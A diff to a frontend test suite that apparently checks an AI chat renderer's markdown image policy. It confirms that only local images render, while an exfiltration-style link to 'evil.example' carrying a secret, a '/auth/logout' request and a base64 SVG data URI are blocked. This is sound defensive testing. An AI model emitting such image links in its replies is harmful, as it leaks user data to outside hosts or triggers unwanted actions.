@@ -146,7 +146,7 @@ describe('markdown image policy', () => {
         message={{
           id: 'img',
           role: 'assistant',
-          text: '![local](/api/plugins/hermes-pwa/file?path=%2Ftmp%2Fa.png)\n\n![leak](https://evil.example/x.png?d=secret)',
+          text: '![local](/api/plugins/hermes-pwa/file?path=%2Ftmp%2Fa.png)\n\n![leak](https://evil.example/x.png?d=secret)\n\n![logout](/auth/logout)\n\n![svg](data:image/svg+xml;base64,PHN2Zy8+)',
           createdAt: undefined,
         }}
       />,
@@ -154,5 +154,7 @@ describe('markdown image policy', () => {
     const imgs = screen.getAllByRole('img');
     expect(imgs.map((i) => i.getAttribute('src'))).toEqual(['/api/plugins/hermes-pwa/file?path=%2Ftmp%2Fa.png']);
     expect(screen.getByText('leak')).toHaveClass('hm-message__blocked-image');
+    expect(screen.getByText('logout')).toHaveClass('hm-message__blocked-image');
+    expect(screen.getByText('svg')).toHaveClass('hm-message__blocked-image');
   });
 });
